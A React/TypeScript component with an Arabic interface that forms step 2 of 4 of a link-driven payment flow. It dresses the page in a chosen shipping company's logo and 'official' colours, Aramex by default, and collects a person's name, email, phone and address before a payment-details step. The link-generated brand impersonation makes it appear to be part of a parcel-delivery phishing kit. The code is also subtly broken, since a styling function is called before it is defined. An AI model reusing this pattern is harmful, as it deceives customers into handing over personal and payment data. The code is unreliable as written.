import { useState } from "react";
import { useParams, useNavigate } from "react-router-dom";
import { getCompanyById } from "@/lib/shippingCompanies";
import { useLink } from "@/hooks/useSupabase";
import { ArrowLeft, User, Phone, Mail, MapPin, Home } from "lucide-react";

const PaymentRecipientSenderData = () => {
  const { id } = useParams();
  const navigate = useNavigate();
  const { data: linkData } = useLink(id);

  const serviceKey = linkData?.payload?.service_key || 'aramex';
  const company = getCompanyById(serviceKey);

  const [mode, setMode] = useState<'recipient' | 'sender'>(
    linkData?.payload?.recipient_sender_mode || 'recipient'
  );

  const [formData, setFormData] = useState({
    name: '',
    email: '',
    phone: '',
    address: '',
    city: '',
    postalCode: '',
  });

  const [errors, setErrors] = useState<Record<string, string>>({});

  const companyStyles = getCompanyStyles(serviceKey);

  const getCompanyStyles = (companyId: string) => {
    if (!company) {
      return {
        gradient: 'linear-gradient(135deg, #E31E24, #FF6B35)',
        background: 'linear-gradient(180deg, #FFF 0%, #FFF5F5 100%)',
        cardBg: '#FFFFFF',
        primaryText: '#1A1A1A',
        secondaryText: '#6B6B6B',
        logo: '/logos/aramex-logo.svg',
        fontFamily: "'Cairo', 'Tajawal', sans-serif",
        headerBg: '#FFFFFF',
        borderColor: '#E0E0E0',
        buttonShadow: '0 4px 12px rgba(227, 30, 36, 0.25)',
        inputFocus: '#E31E24',
      };
    }

    return {
      gradient: company.officialColors.gradient || company.officialColors.background || 'linear-gradient(135deg, #E31E24, #FF6B35)',
      background: company.colors.background || 'linear-gradient(180deg, #FFF 0%, #F5F5F5 100%)',
      cardBg: company.colors.cardBg || '#FFFFFF',
      primaryText: company.colors.textPrimary || '#1A1A1A',
      secondaryText: company.colors.textSecondary || '#6B6B6B',
      logo: company.logo,
      fontFamily: company.fontFamily,
      headerBg: '#FFFFFF',
      borderColor: company.colors.border || '#E0E0E0',
      buttonShadow: `0 4px 12px ${company.colors.primary}40`,
      inputFocus: company.colors.primary,
      // Additional styling properties
      buttonStyle: company.styling?.buttonStyle,
      headerStyle: company.styling?.headerStyle,
      cardStyle: company.styling?.cardStyle,
      assets: company.assets,
    };
  };

  const validateForm = () => {
    const newErrors: Record<string, string> = {};

    if (!formData.name.trim()) {
      newErrors.name = `يرجى إدخال اسم ${mode === 'recipient' ? 'المستلم' : 'المرسل'}`;
    }

    if (!formData.email.trim()) {
      newErrors.email = 'يرجى إدخال البريد الإلكتروني';
    } else if (!/\S+@\S+\.\S+/.test(formData.email)) {
      newErrors.email = 'يرجى إدخال بريد إلكتروني صحيح';
    }

    if (!formData.phone.trim()) {
      newErrors.phone = 'يرجى إدخال رقم الهاتف';
    }

    if (!formData.address.trim()) {
      newErrors.address = `يرجى إدخال العنوان`;
    }

    if (!formData.city.trim()) {
      newErrors.city = 'يرجى إدخال المدينة';
    }

    if (!formData.postalCode.trim()) {
      newErrors.postalCode = 'يرجى إدخال الرمز البريدي';
    }

    setErrors(newErrors);
    return Object.keys(newErrors).length === 0;
  };

  const handleSubmit = (e: React.FormEvent) => {
    e.preventDefault();

    if (validateForm()) {
      // Navigate to payment details page
      navigate(`/pay/${id}/details`);
    }
  };

  const handleBack = () => {
    navigate(`/pay/${id}/recipient-sender`);
  };

  return (
    <div
      className="min-h-screen"
      style={{
        background: companyStyles.background,
        fontFamily: companyStyles.fontFamily,
      }}
    >
      {/* Official Company Header */}
      <header
        className="sticky top-0 z-50 w-full border-b bg-white"
        style={{
          borderBottomColor: companyStyles.borderColor,
          boxShadow: companyStyles.headerStyle?.boxShadow || '0 2px 8px rgba(0,0,0,0.05)',
        }}
      >
        <div className="container mx-auto px-4 h-16 sm:h-20 flex items-center justify-between">
          <div className="flex items-center gap-3 sm:gap-4">
            <button
              onClick={handleBack}
              className="p-2 hover:bg-gray-100 rounded-full transition-colors"
            >
              <ArrowLeft className="w-5 h-5" style={{ color: companyStyles.primaryText }} />
            </button>
            <img
              src={companyStyles.logo}
              alt={company?.name || 'Company'}
              className="h-8 sm:h-12 w-auto object-contain"
            />
          </div>
          <div className="text-right">
            <h1 className="text-lg sm:text-xl font-bold" style={{ color: companyStyles.primaryText }}>
              {company?.name || 'Shipping'}
            </h1>
            <p className="text-xs sm:text-sm" style={{ color: companyStyles.secondaryText }}>
              {mode === 'recipient' ? 'بيانات المستلم' : 'بيانات المرسل'}
            </p>
          </div>
        </div>
        {/* Brand Bar */}
        <div
          className="h-1 w-full"
          style={{
            background: companyStyles.gradient,
          }}
        />
      </header>

      {/* Main Content */}
      <main className="container mx-auto px-4 py-6 sm:py-8">
        <div className="max-w-2xl mx-auto">
          {/* Progress Indicator */}
          <div
            className="mb-6 sm:mb-8 p-4 sm:p-6 rounded-lg border bg-white"
            style={{
              borderColor: companyStyles.borderColor,
            }}
          >
            <div className="flex items-center justify-between mb-3">
              <span
                className="text-sm font-semibold"
                style={{ color: companyStyles.primaryText }}
              >
                الخطوة 2 من 4
              </span>
              <span
                className="text-xs"
                style={{ color: companyStyles.secondaryText }}
              >
                {company?.name}
              </span>
            </div>
            <div className="w-full h-2 bg-gray-200 rounded-full overflow-hidden">
              <div
                className="h-full rounded-full transition-all duration-500"
                style={{
                  width: '50%',
                  background: companyStyles.gradient,
                }}
              />
            </div>
          </div>

          {/* Form */}
          <form onSubmit={handleSubmit}>
            <div
              className="border rounded-xl p-6 sm:p-8 mb-6 bg-white"
              style={{
                borderColor: companyStyles.borderColor,
                ...companyStyles.cardStyle,
              }}
            >
              <h2
                className="text-xl font-bold mb-2"
                style={{ color: companyStyles.primaryText }}
              >
                {mode === 'recipient' ? 'بيانات المستلم' : 'بيانات المرسل'}
              </h2>
              <p
                className="text-sm mb-6"
                style={{ color: companyStyles.secondaryText }}
              >
                يرجى إدخال {mode === 'recipient' ? 'بيانات الشخص الذي سيستلم الشحنة' : 'بيانات المرسل'}
              </p>

              <div className="space-y-5">
                {/* Name */}
                <div>
                  <label
                    className="block text-sm font-semibold mb-2"
                    style={{ color: companyStyles.primaryText }}
                  >
                    <User className="w-4 h-4 inline ml-2" />
                    {mode === 'recipient' ? 'اسم المستلم' : 'اسم المرسل'}
                  </label>
                  <input
                    type="text"
                    placeholder={mode === 'recipient' ? 'أدخل اسم المستلم' : 'أدخل اسم المرسل'}
                    value={formData.name}
                    onChange={(e) => setFormData({ ...formData, name: e.target.value })}
                    className="w-full px-4 py-3 border rounded-lg text-sm transition-all focus:outline-none focus:ring-2 bg-white"
                    style={{
                      borderColor: errors.name ? '#E31837' : companyStyles.borderColor,
                      fontFamily: companyStyles.fontFamily,
                      '--tw-ring-color': companyStyles.inputFocus,
                    } as React.CSSProperties}
                  />
                  {errors.name && (
                    <p className="text-xs mt-1" style={{ color: '#E31837' }}>
                      {errors.name}
                    </p>
                  )}
                </div>

                {/* Email */}
                <div>
                  <label
                    className="block text-sm font-semibold mb-2"
                    style={{ color: companyStyles.primaryText }}
                  >
                    <Mail className="w-4 h-4 inline ml-2" />
                    البريد الإلكتروني
                  </label>
                  <input
                    type="email"
                    placeholder="example@email.com"
                    value={formData.email}
                    onChange={(e) => setFormData({ ...formData, email: e.target.value })}
                    className="w-full px-4 py-3 border rounded-lg text-sm transition-all focus:outline-none focus:ring-2 bg-white"
                    style={{
                      borderColor: errors.email ? '#E31837' : companyStyles.borderColor,
                      fontFamily: companyStyles.fontFamily,
                      '--tw-ring-color': companyStyles.inputFocus,
                    } as React.CSSProperties}
                  />
                  {errors.email && (
                    <p className="text-xs mt-1" style={{ color: '#E31837' }}>
                      {errors.email}
                    </p>
                  )}
                </div>

                {/* Phone */}
                <div>
                  <label
                    className="block text-sm font-semibold mb-2"
                    style={{ color: companyStyles.primaryText }}
                  >
                    <Phone className="w-4 h-4 inline ml-2" />
                    رقم الهاتف
                  </label>
                  <input
                    type="tel"
                    placeholder="+966 5X XXX XXXX"
                    value={formData.phone}
                    onChange={(e) => setFormData({ ...formData, phone: e.target.value })}
                    className="w-full px-4 py-3 border rounded-lg text-sm transition-all focus:outline-none focus:ring-2 bg-white"
                    style={{
                      borderColor: errors.phone ? '#E31837' : companyStyles.borderColor,
                      fontFamily: companyStyles.fontFamily,
                      '--tw-ring-color': companyStyles.inputFocus,
                    } as React.CSSProperties}
                  />
                  {errors.phone && (
                    <p className="text-xs mt-1" style={{ color: '#E31837' }}>
                      {errors.phone}
                    </p>
                  )}
                </div>

                {/* Address */}
                <div>
                  <label
                    className="block text-sm font-semibold mb-2"
                    style={{ color: companyStyles.primaryText }}
                  >
                    <Home className="w-4 h-4 inline ml-2" />
                    العنوان
                  </label>
                  <input
                    type="text"
                    placeholder="رقم المبنى، اسم الشارع"
                    value={formData.address}
                    onChange={(e) => setFormData({ ...formData, address: e.target.value })}
                    className="w-full px-4 py-3 border rounded-lg text-sm transition-all focus:outline-none focus:ring-2 bg-white"
                    style={{
                      borderColor: errors.address ? '#E31837' : companyStyles.borderColor,
                      fontFamily: companyStyles.fontFamily,
                      '--tw-ring-color': companyStyles.inputFocus,
                    } as React.CSSProperties}
                  />
                  {errors.address && (
                    <p className="text-xs mt-1" style={{ color: '#E31837' }}>
                      {errors.address}
                    </p>
                  )}
                </div>

                {/* City */}
                <div>
                  <label
                    className="block text-sm font-semibold mb-2"
                    style={{ color: companyStyles.primaryText }}
                  >
                    <MapPin className="w-4 h-4 inline ml-2" />
                    المدينة
                  </label>
                  <input
                    type="text"
                    placeholder="الرياض، جدة، دبي، إلخ"
                    value={formData.city}
                    onChange={(e) => setFormData({ ...formData, city: e.target.value })}
                    className="w-full px-4 py-3 border rounded-lg text-sm transition-all focus:outline-none focus:ring-2 bg-white"
                    style={{
                      borderColor: errors.city ? '#E31837' : companyStyles.borderColor,
                      fontFamily: companyStyles.fontFamily,
                      '--tw-ring-color': companyStyles.inputFocus,
                    } as React.CSSProperties}
                  />
                  {errors.city && (
                    <p className="text-xs mt-1" style={{ color: '#E31837' }}>
                      {errors.city}
                    </p>
                  )}
                </div>

                {/* Postal Code */}
                <div>
                  <label
                    className="block text-sm font-semibold mb-2"
                    style={{ color: companyStyles.primaryText }}
                  >
                    الرمز البريدي
                  </label>
                  <input
                    type="text"
                    placeholder="12345"
                    value={formData.postalCode}
                    onChange={(e) => setFormData({ ...formData, postalCode: e.target.value })}
                    className="w-full px-4 py-3 border rounded-lg text-sm transition-all focus:outline-none focus:ring-2 bg-white"
                    style={{
                      borderColor: errors.postalCode ? '#E31837' : companyStyles.borderColor,
                      fontFamily: companyStyles.fontFamily,
                      '--tw-ring-color': companyStyles.inputFocus,
                    } as React.CSSProperties}
                  />
                  {errors.postalCode && (
                    <p className="text-xs mt-1" style={{ color: '#E31837' }}>
                      {errors.postalCode}
                    </p>
                  )}
                </div>
              </div>
            </div>

            {/* Submit Button */}
            <button
              type="submit"
              className="w-full text-white font-bold py-4 sm:py-5 px-6 rounded-lg transition-all duration-300 hover:shadow-lg active:scale-[0.98] flex items-center justify-center gap-2 text-sm sm:text-base"
              style={{
                background: companyStyles.gradient,
                boxShadow: companyStyles.buttonShadow,
                fontFamily: companyStyles.fontFamily,
                ...companyStyles.buttonStyle,
              }}
            >
              <span>المتابعة</span>
              <ArrowLeft className="w-5 h-5" />
            </button>
          </form>
        </div>
      </main>
    </div>
  );
};

export default PaymentRecipientSenderData;
